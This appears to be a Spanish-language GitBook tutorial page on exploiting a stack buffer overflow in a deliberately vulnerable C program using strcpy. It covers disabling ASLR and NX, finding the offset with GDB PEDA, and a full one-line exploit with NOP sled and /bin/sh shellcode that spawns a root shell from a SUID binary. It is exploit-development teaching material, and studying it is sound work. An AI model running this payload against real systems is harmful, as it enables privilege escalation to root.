# Linux, Vulnerable functions in C programs



## Configurar entorno

### Install GDB PEDA y checkseck

```bash
# gdb PEDA
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# checkseck
wget https://www.trapkit.de/tools/checksec/checksec.sh
cp checksec.sh /usr/bin/checksec
rm checkseck.sh 
```



### Disable ASLR&#x20;

(from [https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization))

According to an article [How Effective is ASLR on Linux Systems?](https://web.archive.org/web/20210814111134/https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/), you can configure ASLR in Linux using the `/proc/sys/kernel/randomize_va_space` interface.

> The following values are supported:
>
> * 0 – No randomization. Everything is static.
> * 1 – Conservative randomization. Shared libraries, stack, `mmap()`, VDSO and heap are randomized.
> * 2 – Full randomization. In addition to elements listed in the previous point, memory managed through `brk()` is also randomized.

So, to disable it, run

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

and to enable it again, run

```
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

This won't survive a reboot, so you'll have to configure this in `sysctl`. Add a file `/etc/sysctl.d/01-disable-aslr.conf` containing:

```
kernel.randomize_va_space = 0
```

should permanently disable this.



### Código

```c
#include <stdio.h>

int main(int argc, char *argv[]){
        char buffer[64];
        strcpy(buffer, argv[1]);
}
```



## Explotación

### Sin ASLR ni NX



\###Flags for compile disabling DEP (NX):

{% code overflow="wrap" lineNumbers="true" %}
```bash
gcc -z execstack -g -fno-stack-protector -mpreferred-stack-boundary=2 <file> -o <elf-name>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

#### Calcular offset

```bash
gdb ./<elf-file>     # Inicializar PEDA
pattern arg 100      # Crear una cadena para calcular el offset de 100 bytes de long.
run                  # Correr el programa con el offset creado
pattern search       # Calcular el offset
```

Como vemos se produce un BOF al correr el programa

<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

Con un offset de 68 bytes:

<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

Ahora vamos a agregar unos nops seguido de estos vamos a pasar una shellcode que queramos ejecutar y elegir una dirección intermedia de los nops que será la que pasemos al EIP para que ejecute nuestra shellcode. Pero antes tenemos que determinar la dirección en la que están los NOP's, por lo que debemos efectuar el BOF, las "A" se repiten 68 veces debido a que generan el desbordamiento, las "B" hacen referencia al EIP y los "\x90" a los NOP's:



`run $(python -c 'print "A" * 68 + "BBBB" + "\x90" * 200 ') # en PEDA`

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Ahora debemos buscar una shellcode que nos interese y ponerla después de los NOP's, y elegir una dirección de los NOP's para decirle al EIP que salte a esta dirección,como están en formato Little Endian habrá que invertir su orden:

{% code overflow="wrap" %}
```
# Shellcode for 32 bits spawn a /bin/sh
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```
{% endcode %}

Como el archivo es del propietario root y cuenta con permisos SUID podemos ejectuar el siguiente comando para obtener un sh como root en la maquina:

```
./<elf-SUID> $(python -c 'print <OFFSET> + <EIP-ADDRESS> + <NOPS> + <SHELLCODE>')
./vuln $(python -c 'print "A" * 68 + "\xc0\xf4\xff\xbf" + "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

